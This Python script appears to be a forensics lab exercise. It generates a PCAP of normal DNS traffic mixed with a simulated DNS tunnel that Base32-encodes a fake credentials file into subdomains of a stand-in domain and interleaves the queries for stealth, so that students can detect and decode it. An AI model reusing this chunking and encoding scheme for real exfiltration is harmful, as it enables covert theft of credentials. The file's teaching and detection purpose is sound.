#!/usr/bin/env python3
"""
MAR404 - Clase 3 - Lab 5
Genera un PCAP con tráfico DNS que incluye:
- Queries DNS normales (navegación web, email, etc.)
- Túnel DNS con datos exfiltrados encoded en subdominios (Base32)

El estudiante debe:
1. Identificar el dominio con alto volumen de queries
2. Detectar subdominios anormalmente largos
3. Calcular entropía para confirmar datos encoded
4. Extraer y decodificar los datos exfiltrados
"""

from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
import base64
import random
import string
import os

OUTPUT_FILE = "/pcap/dns_tunnel_lab.pcap"

# Configuración
CLIENT_IP = "10.0.1.50"
DNS_SERVER = "10.0.1.1"
TUNNEL_DNS_SERVER = "198.51.100.50"
TUNNEL_DOMAIN = "data.exfil-tunnel.net"

# Dominios legítimos para tráfico normal
LEGIT_DOMAINS = [
    "www.google.com", "mail.google.com", "drive.google.com",
    "www.microsoft.com", "login.microsoftonline.com", "outlook.office365.com",
    "www.github.com", "api.github.com",
    "cdn.cloudflare.com", "fonts.googleapis.com",
    "www.linkedin.com", "static.linkedin.com",
    "slack-edge.com", "app.slack.com",
    "zoom.us", "us02web.zoom.us",
    "www.empresa-ejemplo.cl", "mail.empresa-ejemplo.cl",
    "intranet.empresa-ejemplo.cl", "vpn.empresa-ejemplo.cl",
]

# Datos a exfiltrar (simulación de archivo de credenciales)
EXFIL_DATA = """# Credentials Database Export
admin:P@ssw0rd123!
root:Tr0ub4dor&3
carlos.mendez:Summer2026!
maria.gonzalez:C0mpl3x#Pass
backup_svc:Bkup$erv1ce2026
db_admin:Sql@dmin#2026
api_key:sk-proj-abc123def456ghi789
aws_secret:AKIAIOSFODNN7EXAMPLE
"""


def create_normal_dns_query(domain, qtype="A"):
    """Crea un par query/response DNS normal."""
    sport = random.randint(49152, 65535)
    txid = random.randint(1, 65535)
    
    query = IP(src=CLIENT_IP, dst=DNS_SERVER) / \
            UDP(sport=sport, dport=53) / \
            DNS(id=txid, rd=1, qd=DNSQR(qname=domain, qtype=qtype))
    
    # Generar IP de respuesta aleatoria
    resp_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    response = IP(src=DNS_SERVER, dst=CLIENT_IP) / \
               UDP(sport=53, dport=sport) / \
               DNS(id=txid, qr=1, aa=0, rd=1, ra=1,
                   qd=DNSQR(qname=domain, qtype=qtype),
                   an=DNSRR(rrname=domain, type="A", rdata=resp_ip, ttl=random.randint(60, 3600)))
    
    return [query, response]


def create_tunnel_dns_query(data_chunk, seq_num):
    """Crea un par query/response DNS de túnel con datos en subdominio."""
    # Encode data in Base32 (common in DNS tunneling)
    encoded = base64.b32encode(data_chunk.encode()).decode().rstrip('=').lower()
    
    # Construir subdominio: seq.encoded_data.TUNNEL_DOMAIN
    subdomain = f"{seq_num:04d}.{encoded}.{TUNNEL_DOMAIN}"
    
    sport = random.randint(49152, 65535)
    txid = random.randint(1, 65535)
    
    # Query tipo TXT (común en DNS tunneling para recibir datos)
    query = IP(src=CLIENT_IP, dst=DNS_SERVER) / \
            UDP(sport=sport, dport=53) / \
            DNS(id=txid, rd=1, qd=DNSQR(qname=subdomain, qtype="A"))
    
    # Response con IP que codifica ACK
    response = IP(src=DNS_SERVER, dst=CLIENT_IP) / \
               UDP(sport=53, dport=sport) / \
               DNS(id=txid, qr=1, aa=1, rd=1, ra=1,
                   qd=DNSQR(qname=subdomain, qtype="A"),
                   an=DNSRR(rrname=subdomain, type="A", rdata=f"10.0.{seq_num // 256}.{seq_num % 256}", ttl=1))
    
    return [query, response]


def generate_pcap():
    """Genera el PCAP completo."""
    all_packets = []
    
    # --- Tráfico DNS normal (100 queries) ---
    print("[+] Generando tráfico DNS normal (100 queries)...")
    for i in range(100):
        domain = random.choice(LEGIT_DOMAINS)
        qtype = random.choice(["A", "A", "A", "AAAA", "MX"])
        packets = create_normal_dns_query(domain, qtype)
        all_packets.extend(packets)
    
    # --- Túnel DNS (exfiltración de datos) ---
    print("[+] Generando túnel DNS (exfiltración de credenciales)...")
    
    # Dividir datos en chunks de 30 bytes (límite práctico para subdominios)
    chunk_size = 30
    chunks = [EXFIL_DATA[i:i+chunk_size] for i in range(0, len(EXFIL_DATA), chunk_size)]
    
    for seq, chunk in enumerate(chunks):
        tunnel_packets = create_tunnel_dns_query(chunk, seq)
        all_packets.extend(tunnel_packets)
        
        # Intercalar con queries normales para ser más sigiloso
        if seq % 3 == 0:
            normal = create_normal_dns_query(random.choice(LEGIT_DOMAINS))
            all_packets.extend(normal)
    
    # --- Más tráfico normal al final ---
    print("[+] Generando tráfico DNS normal adicional (50 queries)...")
    for i in range(50):
        domain = random.choice(LEGIT_DOMAINS)
        packets = create_normal_dns_query(domain)
        all_packets.extend(packets)
    
    # Mezclar parcialmente (mantener cierto orden temporal)
    # No mezclar completamente para preservar el patrón de beaconing
    
    print(f"[+] Total paquetes: {len(all_packets)}")
    print(f"[+] Queries normales: ~150 pares")
    print(f"[+] Queries de túnel: {len(chunks)} pares")
    print(f"[+] Datos exfiltrados: {len(EXFIL_DATA)} bytes")
    
    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    wrpcap(OUTPUT_FILE, all_packets)
    print(f"[+] PCAP guardado en {OUTPUT_FILE}")
    print("[+] Lab 5 listo para análisis")


if __name__ == "__main__":
    generate_pcap()
